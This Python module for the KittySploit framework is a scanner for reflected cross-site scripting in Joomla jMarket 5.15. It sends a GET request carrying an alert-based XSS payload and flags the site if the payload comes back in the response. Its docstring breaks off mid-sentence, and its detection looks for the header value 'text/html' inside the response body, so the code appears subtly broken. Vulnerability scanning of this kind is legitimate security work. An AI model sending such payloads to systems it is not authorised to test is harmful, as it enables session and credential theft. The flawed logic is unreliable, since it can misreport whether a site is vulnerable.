#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla jMarket 5.15 - Cross-Site Scripting Detection',
        'description': "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'packetstorm', 'xss', 'packetstrom', 'joomla', 'jmarket', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/168581/Joomla-jMarket-5.15-Cross-Site-Scripting.html',
            'https://cxsecurity.com/issue/WLB-2022100002',
            'https://extensions.joomla.org/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_jvouchers&controller=catalog-results&task=query&wajx=1&wmjx=1&tmpl=component&type=raw&crtyid=12&trucs[x][search]=gx3vt%20onfocus=alert(document.domain)%20autofocus=%20itkrzsug7w5', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('onfocus=alert(document.domain) autofocus=', 'catalog-results', 'joomla',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Joomla jMarket 5.15 - Cross-Site Scripting detected",
                path='/index.php?option=com_jvouchers&controller=catalog-results&task=query&wajx=1&wmjx=1&tmpl=component&type=raw&crtyid=12&trucs[x][search]=gx3vt%20onfocus=alert(document.domain)%20autofocus=%20itkrzsug7w5',
            )
            return True
        return False

